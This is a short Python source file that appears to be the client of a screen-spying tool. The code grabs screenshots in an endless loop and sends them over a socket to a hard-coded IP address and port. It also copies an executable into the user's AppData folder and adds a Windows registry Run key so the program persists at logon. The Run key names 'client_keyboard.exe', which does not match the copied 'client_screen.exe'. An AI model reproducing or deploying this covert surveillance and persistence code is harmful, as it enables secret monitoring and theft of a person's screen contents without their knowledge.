def main():
    import socket
    import pyautogui
    import os
    username = os.getlogin()
    
    screenfilename = f"C:\\Users\\{username}\\AppData\\Local\\Temp\\screenshot.png"
    HOST = "192.168.1.75"
    PORT = 6000
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        while True:
            try:
                scrshot = pyautogui.screenshot()
                scrshot.save(screenfilename)
                with open(screenfilename, "rb") as f:
                    s.send(f.read(1000000000))
            except ConnectionResetError:
                exit(0)
            except ConnectionRefusedError:
                exit(0)
            except TimeoutError:
                exit(0)
            except OSError:
                exit(0)

if __name__ == "__main__":
    import winreg
    import os
    username = os.getlogin()
    os.system(f"copy client_screen.exe C:\\Users\\{username}\\AppData\\Roaming")
    key = winreg.HKEY_CURRENT_USER
    key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    winreg.SetValueEx(winreg.OpenKey(key, key_value, 0, winreg.KEY_ALL_ACCESS), "6000_Port_screen", 0, winreg.REG_SZ, f"C:\\Users\\{username}\\AppData\\Roaming\\client_keyboard.exe")
    
    main()